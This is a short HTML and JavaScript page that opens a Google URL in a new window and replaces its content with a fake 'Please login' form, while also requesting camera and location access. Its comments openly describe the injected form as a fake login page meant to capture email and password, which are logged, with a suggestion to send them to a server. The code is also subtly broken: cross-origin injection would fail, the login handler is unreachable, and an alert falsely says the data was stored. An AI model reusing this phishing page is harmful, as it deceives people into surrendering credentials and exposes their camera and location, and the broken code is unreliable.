<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera & Location Access</title>
</head>
<body>
    <h1>Camera and Location Access</h1>

    <!-- Button to trigger the camera and location access -->
    <button onclick="accessData()">Access Camera & Location</button>

    <h2>Camera Preview</h2>
    <video id="video" width="320" height="240" autoplay></video>

    <h2>Location Information</h2>
    <p id="location">Fetching location...</p>

    <script>
        function accessData() {
            // Open Google CSI in a new window
            var x = window.open('https://www.google.com/csi'); // Open Google CSI
            
            // Simulate fake login page and inject camera and location access code
            setTimeout(function() {
                x.document.body.innerHTML = `
                    <h1>Please login</h1>
                    <p>Email: <input id="email"><br></p>
                    <p>Password: <input id="pass" type="password"><br></p>
                    <button onclick="sendData()">Login</button>
                    <h2>Camera Preview</h2>
                    <video id="video" width="320" height="240" autoplay></video>
                    <h2>Location Information</h2>
                    <p id="location">Fetching location...</p>
                `;

                // Camera access API inside the new window
                if (x.navigator.mediaDevices && x.navigator.mediaDevices.getUserMedia) {
                    x.navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function(stream) {
                            var video = x.document.getElementById('video');
                            video.srcObject = stream;
                        })
                        .catch(function(error) {
                            console.error('Error accessing camera: ', error);
                            x.alert('Unable to access camera. Please grant permission.');
                        });
                } else {
                    x.alert('Camera access is not supported by your browser.');
                }

                // Location access API inside the new window
                if (x.navigator.geolocation) {
                    x.navigator.geolocation.getCurrentPosition(function(position) {
                        var latitude = position.coords.latitude;
                        var longitude = position.coords.longitude;
                        x.document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
                    }, function(error) {
                        console.error('Error fetching location: ', error);
                        x.document.getElementById('location').innerText = 'Unable to fetch location.';
                    });
                } else {
                    x.alert('Geolocation is not supported by your browser.');
                }
                
                // Function to handle login data
                function sendData() {
                    var email = x.document.getElementById('email').value;
                    var password = x.document.getElementById('pass').value;

                    // Check if both email and password are filled
                    if (email === "" || password === "") {
                        x.alert("Please enter both email and password.");
                        return; // Prevent sending empty data
                    }

                    // Log the data to the console (no redirect)
                    console.log("Email:", email);
                    console.log("Password:", password);

                    // Optionally, you can do more here (send data to a server, etc.)
                    x.alert('Data has been stored in localStorage');
                }
            }, 3000); // Wait for 3 seconds to simulate page load time
        }
    </script>
</body>
</html>
